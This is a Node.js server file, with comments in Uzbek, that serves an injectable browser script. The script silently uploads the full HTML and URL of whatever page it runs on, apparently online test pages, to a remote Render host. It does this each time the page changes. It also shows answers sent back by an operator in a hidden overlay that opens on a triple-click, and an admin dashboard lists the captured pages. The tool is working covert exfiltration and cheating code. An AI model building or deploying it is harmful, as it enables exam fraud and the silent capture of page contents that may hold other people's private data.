const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const cookieParser = require("cookie-parser");

const app = express();

// ========================================================
// ⚙️ SOZLAMALAR
const MY_SERVER_URL = "https://server-xkuu.onrender.com"; // Render manzili
const ADMIN_PASSWORD = "8908"; 
// ========================================================

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(cookieParser());

// --- XOTIRA ---
let capturedPages = []; 
let chatHistory = ""; 
let lastUpdateID = 0;

const getUzTime = () => new Date().toLocaleString("uz-UZ", { timeZone: "Asia/Tashkent", hour12: false });

const checkAuth = (req, res, next) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) next();
    else res.redirect("/login");
};

// ========================================================
// 📜 CLIENT SKRIPTI (f1.js) - CHAP PASTKI BURCHAKDA
// ========================================================
const clientScript = `
(function(){
  const BASE = '${MY_SERVER_URL}'; 
  let lastSince=0, msgBox=null, statusBox=null, clickCount=0;
  let currentUrl = window.location.href;
  let isBoxOpen = false; 

  // 1. STATUS OYNACHASI (Suro'v ketdi / Bog'landi) - O'ng tepada qoladi (xalaqit bermasligi uchun)
  function showStatus(text, color) {
    if(!statusBox) {
        statusBox = document.createElement('div');
        Object.assign(statusBox.style, {
            position: 'fixed', top: '10px', right: '10px',
            padding: '5px 10px', borderRadius: '4px',
            color: '#fff', fontSize: '11px', fontFamily: 'sans-serif',
            zIndex: 2147483647, pointerEvents: 'none',
            transition: 'opacity 0.5s', fontWeight: 'bold'
        });
        document.body.appendChild(statusBox);
    }
    statusBox.innerText = text;
    statusBox.style.background = color;
    statusBox.style.opacity = '1';
    statusBox.style.display = 'block';
    setTimeout(() => { statusBox.style.opacity = '0'; }, 2000);
  }

  // 2. XABAR OYNASI (CHAT) - CHAP PASTDA
  function makeMsgBox(){
    if(msgBox) return msgBox;
    msgBox = document.createElement('div');
    Object.assign(msgBox.style,{
      position:'fixed', 
      left:'10px', bottom:'10px',  // <-- CHAP PASTKI BURCHAK
      width:'280px',              
      maxHeight:'150px',           // Balandligi
      background:'rgba(0, 0, 0, 0.9)', 
      color:'#00ff00',            
      padding:'10px',
      font:'13px monospace',     
      borderRadius:'5px',
      zIndex:2147483647,
      display:'none',             // Boshida yopiq
      border:'1px solid #00ff00',
      boxShadow:'0 0 10px rgba(0,255,0,0.2)',
      overflowY:'auto',           // Scroll
      whiteSpace:'pre-wrap'
    });
    
    // Scroll dizayni
    const style = document.createElement('style');
    style.innerHTML = \`
      ::-webkit-scrollbar { width: 4px; } 
      ::-webkit-scrollbar-track { background: #111; }
      ::-webkit-scrollbar-thumb { background: #00ff00; }
    \`;
    document.head.appendChild(style);

    document.body.appendChild(msgBox);
    return msgBox;
  }

  // 3. HTML YUBORISH
  async function sendPage(){
    try{
      showStatus("⏳ Yuborilmoqda...", "rgba(255, 165, 0, 0.8)");
      await fetch(BASE+'/upload-html',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
            html: document.documentElement.outerHTML,
            url: window.location.href
        })
      });
      showStatus("✅ Bog'landi", "rgba(0, 128, 0, 0.8)");
    }catch(e){
      showStatus("❌ Xatolik", "rgba(255, 0, 0, 0.8)");
    }
  }

  // 4. XABAR OLISH
  async function fetchLatest(){
    try{
      const r=await fetch(BASE+'/latest?since='+lastSince);
      const j=await r.json();
      
      if(j.success){
        const b = makeMsgBox();
        b.innerText = j.pureMessage; 
        
        // Yangi xabar kelsa va oyna yopiq bo'lsa -> Toast
        if(j.timestamp > lastSince) {
            if(!isBoxOpen) showStatus("📩 Yangi xabar!", "#007bff");
            else b.scrollTop = b.scrollHeight; // Ochiq bo'lsa pastga tushir
        }
        lastSince = j.timestamp;
      }
    }catch(e){}
  }

  // --- MANTIQ ---

  // A) URL Kuzatuv
  setInterval(()=>{
    if(currentUrl !== window.location.href){
        currentUrl = window.location.href;
        sendPage(); 
    }
  }, 1000);

  // B) DOM Kuzatuv (Test savoli o'zgarsa)
  let debounceTimer;
  const observer = new MutationObserver(() => {
     clearTimeout(debounceTimer);
     debounceTimer = setTimeout(() => { sendPage(); }, 2000);
  });
  observer.observe(document.body, { childList: true, subtree: true });

  // C) 3 marta bosish -> Oynani ochish/yopish
  document.addEventListener('click', (e) => {
      if(e.button === 0) {
        clickCount++;
        setTimeout(() => clickCount = 0, 500);
        
        if(clickCount >= 3) {
            clickCount = 0;
            const b = makeMsgBox();
            
            if(isBoxOpen) {
                b.style.display = 'none';
                isBoxOpen = false;
            } else {
                b.style.display = 'block';
                isBoxOpen = true;
                fetchLatest();
                // Chat ochilganda avto pastga tushirish
                setTimeout(()=> b.scrollTop = b.scrollHeight, 100);
            }
        }
      }
  });

  sendPage();
  setInterval(fetchLatest, 3000);
})();
`;

// ========================================================
// 🛣 ROUTES
// ========================================================

app.get("/f1.js", (req, res) => {
    res.setHeader("Content-Type", "application/javascript");
    res.send(clientScript);
});

// LOGIN
app.get("/login", (req, res) => {
    if (req.cookies.admin_token === ADMIN_PASSWORD) return res.redirect("/");
    res.send(`<body style="background:#000;display:flex;justify-content:center;align-items:center;height:100vh"><form action="/login" method="POST"><input type="password" name="password" style="background:#111;border:1px solid #333;color:#fff;padding:10px;text-align:center;" placeholder="PIN" autofocus></form></body>`);
});
app.post("/login", (req, res) => {
    if (req.body.password === ADMIN_PASSWORD) {
        res.cookie("admin_token", ADMIN_PASSWORD, { maxAge: 86400000, httpOnly: true });
        res.redirect("/");
    } else res.redirect("/login");
});
app.get("/logout", (req, res) => { res.clearCookie("admin_token"); res.redirect("/login"); });

// API
app.get("/api/pages", checkAuth, (req, res) => {
    const list = capturedPages.map((p, index) => ({ id: index, url: p.url, date: p.date })).reverse();
    res.json(list);
});

// DASHBOARD
app.get("/", checkAuth, (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Admin V4</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { background: #111; color: #ccc; font-family: monospace; padding: 10px; margin: 0; }
                .box { border: 1px solid #333; background: #1a1a1a; padding: 10px; margin-bottom: 10px; }
                input { width: 65%; padding: 8px; background: #000; border: 1px solid #555; color: #fff; }
                button { padding: 8px; cursor: pointer; border: none; font-weight: bold; }
                .btn-send { background: #007bff; color: white; width: 30%; }
                .chat-history { background: #000; color: #0f0; padding: 5px; height: 120px; overflow-y: auto; border: 1px solid #333; font-size: 12px; margin-top:5px; white-space: pre-wrap; }
                .page-item { display: flex; justify-content: space-between; background: #222; padding: 8px; margin-bottom: 2px; border-bottom: 1px solid #333; font-size: 11px; }
                .btn-view { background: #6f42c1; color: white; text-decoration: none; padding: 2px 8px; border-radius: 3px; }
            </style>
        </head>
        <body>
            <div style="display:flex;justify-content:space-between;margin-bottom:5px;font-size:10px">
                <span>Monitor Active</span> <a href="/logout" style="color:red">Exit</a>
            </div>

            <!-- CHAT -->
            <div class="box">
                <form action="/set-message" method="POST" style="display:flex; justify-content:space-between">
                    <input type="text" name="msg" placeholder="Xabar..." autocomplete="off">
                    <button class="btn-send">YUBORISH</button>
                </form>
                <div class="chat-history">${chatHistory || ""}</div>
                <form action="/clear-history" method="POST"><button style="width:100%;background:#333;color:#fff;margin-top:5px;font-size:10px">Tozalash</button></form>
            </div>

            <!-- PAGES -->
            <div class="box">
                <div style="display:flex;justify-content:space-between;margin-bottom:5px">
                    <b>Sahifalar</b>
                    <form action="/clear-pages" method="POST" style="margin:0"><button style="background:none;color:red;border:none">X</button></form>
                </div>
                <div id="pages-container">Yuklanmoqda...</div>
            </div>

            <script>
                function loadPages() {
                    fetch('/api/pages').then(r=>r.json()).then(d=>{
                        const c = document.getElementById('pages-container');
                        if(!d.length) { c.innerHTML='Empty'; return; }
                        c.innerHTML = d.map(p => \`
                            <div class="page-item">
                                <div>#\${p.id+1} | \${p.date}</div>
                                <a href="/view-site/\${p.id}" target="_blank" class="btn-view">OCHISH</a>
                            </div>\`).join('');
                    });
                }
                setInterval(loadPages, 3000);
                loadPages();
            </script>
        </body>
        </html>
    `);
});

app.get("/view-site/:id", checkAuth, (req, res) => {
    const p = capturedPages[req.params.id];
    if (p) res.send(p.html.replace("<head>", `<head><base href="${p.url}">`));
    else res.send("Not found");
});

app.post("/upload-html", (req, res) => {
    capturedPages.push({ url: req.body.url||"?", html: req.body.html||"", date: getUzTime() });
    if(capturedPages.length>50) capturedPages.shift();
    res.json({status:"ok"});
});

app.post("/set-message", checkAuth, (req, res) => {
    if(req.body.msg) {
        chatHistory += `[${getUzTime().split(' ')[1]}] ${req.body.msg}\n`;
        lastUpdateID = Date.now();
    }
    res.redirect("/");
});
app.post("/clear-history", checkAuth, (req, res) => { chatHistory = ""; lastUpdateID = Date.now(); res.redirect("/"); });
app.post("/clear-pages", checkAuth, (req, res) => { capturedPages = []; res.redirect("/"); });

app.get("/latest", (req, res) => {
    let pureText = chatHistory.replace(/\[.*?\] /g, ""); 
    res.json({ success: true, pureMessage: pureText, timestamp: lastUpdateID });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server: ${PORT}`));
